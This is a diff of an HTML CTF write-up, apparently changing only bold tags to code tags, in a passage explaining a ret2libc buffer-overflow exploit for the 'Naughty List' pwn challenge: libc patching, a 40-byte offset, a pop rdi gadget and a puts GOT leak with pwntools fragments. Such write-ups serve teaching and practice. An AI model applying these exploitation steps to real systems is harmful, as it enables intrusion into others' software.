@@ -489,7 +489,7 @@ io.interactive()
 </code></pre>
 <p>Running this code either locally or remotely should drop you a shell, note that you can practice writing your own shellcode, but the problem with the read function is that it reads input until it encounters a new line, this means if you write shellcode for this challenge it can't contains any 0x0a opcodes, for those who study at ASU you should be pretty good evading filters on shellcode :P</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="cyber-santa-is-coming-to-town-pwn-naughty-list"><a class="header" href="#cyber-santa-is-coming-to-town-pwn-naughty-list">Cyber Santa is Coming to Town (Pwn Naughty List)</a></h1>
-<p>This challenge was remarkable because it was one of the simplest and most educative <strong>ret2libc</strong> challenge i've done so far. It was pretty straightforward, finding the vulnerability took me a minute or two, and since they gave me a <strong>libc.so.6</strong> file, i knew it was ret2libc.</p>
+<p>This challenge was remarkable because it was one of the simplest and most educative <code>ret2libc</code> challenge i've done so far. It was pretty straightforward, finding the vulnerability took me a minute or two, and since they gave me a <code>libc.so.6</code> file, i knew it was ret2libc.</p>
 <h2 id="preparing-the-challenge"><a class="header" href="#preparing-the-challenge">Preparing the Challenge</a></h2>
 <p>Before starting the challenge you will need to make sure you have the right version of the linker and the right version of libc, usually you can check the string of the libc binary and search for a ubuntu version then you can run a docker on that right version.</p>
 <pre><code>$ strings ./libc.so.6 | grep &quot;ubuntu&quot;
@@ -497,11 +497,11 @@ GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.4) stable release version 2.27.
 &lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.
 GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
 </code></pre>
-<p>Looking at the output we can see that our program was compiled using <strong>ubuntu version 18.04</strong>, you can run a docker with that specific version of ubuntu using the following command.</p>
+<p>Looking at the output we can see that our program was compiled using <code>ubuntu version 18.04</code>, you can run a docker with that specific version of ubuntu using the following command.</p>
 <pre><code>$ docker run -it ubuntu:18.04
 root@1e005e022242:/#
 </code></pre>
-<p>But for this challenge we will use <strong>pwninit</strong>, so i don't have to set up a whole docker environment, as you have probably noticed docker doesn't come with any useful binaries for exploitation, using my main machine will be way much simpler. So you can start by getting <strong>pwninit</strong> using the following command.</p>
+<p>But for this challenge we will use <code>pwninit</code>, so i don't have to set up a whole docker environment, as you have probably noticed docker doesn't come with any useful binaries for exploitation, using my main machine will be way much simpler. So you can start by getting <code>pwninit</code> using the following command.</p>
 <pre><code>$ cargo install pwninit
 </code></pre>
 <p>Then you can run pwninit in the directory of the vulnerable binary.</p>
@@ -513,10 +513,10 @@ ld: ./ld-2.27.so
 copying ./naughty_list to ./naughty_list_patched
 running patchelf on ./naughty_list_patched
 </code></pre>
-<p>You can either used the binary <strong>pwninit</strong> generated or patched the binary on your own, you would usually do this with the <strong>patchelf</strong> utility.</p>
+<p>You can either used the binary <code>pwninit</code> generated or patched the binary on your own, you would usually do this with the <code>patchelf</code> utility.</p>
 <pre><code>$ patchelf --set-interpreter ./ld-2.27.so --replace-needed libc.so.6 /challenge/pwn_naughty_list/libc.so.6 ./naughty_list
 </code></pre>
-<p>Then you should now be able to run your binary with the right linker and libc versions ! You can verify this by using <strong>ldd</strong> on your binary.</p>
+<p>Then you should now be able to run your binary with the right linker and libc versions ! You can verify this by using <code>ldd</code> on your binary.</p>
 <pre><code>$ ldd ./naughty_list
         linux-vdso.so.1 (0x00007ffee7b73000)
         /challenge/pwn_naughty_list/libc.so.6 (0x00007f1c32b1f000)
@@ -528,10 +528,10 @@ running patchelf on ./naughty_list_patched
 <p>First thing i will do is find the vulnerable point in the program, i suggest you open the binary in ghidra for that, or you can go in fully 1337 mode and use only gdb. (disassemblers exist for a good reason tho).</p>
 <p>Looking at the main function we can see 4 different functions that asks for our input.
 <img src="https://i.imgur.com/cgUkVpv.png" alt="Potentially Vulnerable Functions" /></p>
-<p>Looking deeper into each of these functions we notice that the functions <strong>get_name, get_surname, get_age</strong>. However we do not have any restrictions on our last function <strong>get_descr</strong>.
+<p>Looking deeper into each of these functions we notice that the functions <code>get_name, get_surname, get_age</code>. However we do not have any restrictions on our last function <code>get_descr</code>.
 <img src="https://i.imgur.com/GRBbFVq.png" alt="No Restrictions on get_descr input" /></p>
-<p>We can also see in the screenshot that we read <strong>0x3c0 bytes (960)</strong> of input inside a buffer of <strong>32 bytes</strong> which is clearly vulnerable to a buffer overflow.</p>
-<p>We can try to make our binary <strong>SEGFAULT</strong> by running it and sending a little more than ~32 bytes of input, let's try this in practice</p>
+<p>We can also see in the screenshot that we read <code>0x3c0 bytes (960)</code> of input inside a buffer of <code>32 bytes</code> which is clearly vulnerable to a buffer overflow.</p>
+<p>We can try to make our binary <code>SEGFAULT</code> by running it and sending a little more than ~32 bytes of input, let's try this in practice</p>
 <pre><code>$ ./naughty_list
 
 ~ Ho Ho Ho Santa is here ~
@@ -558,7 +558,7 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 [*] 🎅 will take a better look and hopefuly you will get your 🎁!
 [1]    3876 segmentation fault (core dumped)  ./naughty_list
 </code></pre>
-<p>Running a cyclic string with our binary in gdb reveals that we overwrite our return address after <strong>40 bytes of input</strong>. We can start writing our exploit the following way.</p>
+<p>Running a cyclic string with our binary in gdb reveals that we overwrite our return address after <code>40 bytes of input</code>. We can start writing our exploit the following way.</p>
 <pre><code class="language-py">import pwn
 
 e = pwn.ELF(&quot;./naughty_list&quot;)
@@ -568,7 +568,7 @@ pwn.context.arch = &quot;amd64&quot;
 PADDING = 40
 </code></pre>
 <p>Now the second step in a ret2libc attack is to leak the address of a functions in the .got section, this should be pretty simple to do.</p>
-<p>Let's start by finding a <strong>pop_rdi; ret</strong> instruction using ropper, so we can align our stack before starting to do a <strong>ropchain</strong>.</p>
+<p>Let's start by finding a <code>pop_rdi; ret</code> instruction using ropper, so we can align our stack before starting to do a <code>ropchain</code>.</p>
 <pre><code>$ ropper -- --search &quot;pop rdi; ret&quot; --file ./naughty_list
 [INFO] Load gadgets from cache
 [LOAD] loading... 100%
@@ -581,8 +581,8 @@ PADDING = 40
 <p>We see that at address <code>0x0000000000401443</code>, we have the <code>pop rdi; ret</code> instruction. We can take that value and add it into our python script.</p>
 <pre><code class="language-py">pop_rdi = pwn.p64(0x0000000000401443)
 </code></pre>
-<p>Sometimes using <strong>ret</strong> instead of <code>pop rdi; ret</code> is a better idea, since it's totally doable you can search for a <strong>ret</strong> instruction in the binary and you can add it the same way we just did with <strong>pop_rdi</strong>.</p>
-<p>Next thing we need to do is to find a function we want to leak the address of, so what i did was open <strong>bpython or python</strong>, and you can do the following to see the different functions available in the <strong>.got</strong> section.</p>
+<p>Sometimes using <code>ret</code> instead of <code>pop rdi; ret</code> is a better idea, since it's totally doable you can search for a <code>ret</code> instruction in the binary and you can add it the same way we just did with <code>pop_rdi</code>.</p>
+<p>Next thing we need to do is to find a function we want to leak the address of, so what i did was open <code>bpython or python</code>, and you can do the following to see the different functions available in the <code>.got</code> section.</p>
 <pre><code>&gt;&gt;&gt; import pwn
 &gt;&gt;&gt; e = pwn.ELF(&quot;./naughty_list&quot;)
 [*] '/challenge/pwn_naughty_list/naughty_list'
@@ -597,10 +597,10 @@ puts': 6299528, 'strlen': 6299536, 'printf': 6299544, 'memset': 6299552, 'alarm'
 6299576, 'strcmp': 6299584, 'time': 6299592, 'setvbuf': 6299600, '__isoc99_scanf': 6299608, 'fwrite': 6299616, 'ran
 d': 6299624}
 </code></pre>
-<p>We can notice a few functions we can leak, but for this challenge we will simply use <strong>puts</strong>, so we can continue our script the following way.</p>
+<p>We can notice a few functions we can leak, but for this challenge we will simply use <code>puts</code>, so we can continue our script the following way.</p>
 <pre><code class="language-py">puts_at_got = pwn.p64(e.got.puts)
 </code></pre>
-<p>And since we want to leak the address of that function we need to get the address of <strong>puts</strong> in the <strong>plt</strong> section, this will cause <strong>puts</strong> to be called with the address of <strong>puts_at_got</strong> as argument (the address of puts in libc), therefore leaking the address on the screen, we can use pwntools to receive the line and to unpack the value. You can add thefollowing to your script.</p>
+<p>And since we want to leak the address of that function we need to get the address of <code>puts</code> in the <code>plt</code> section, this will cause <code>puts</code> to be called with the address of <code>puts_at_got</code> as argument (the address of puts in libc), therefore leaking the address on the screen, we can use pwntools to receive the line and to unpack the value. You can add thefollowing to your script.</p>
 <pre><code class="language-py">puts_at_plt = pwn.p64(e.plt.puts)
 </code></pre>
 <p>Okay so now we can see if our script is able to leak the address of puts on the screen, your script should look like the following.</p>
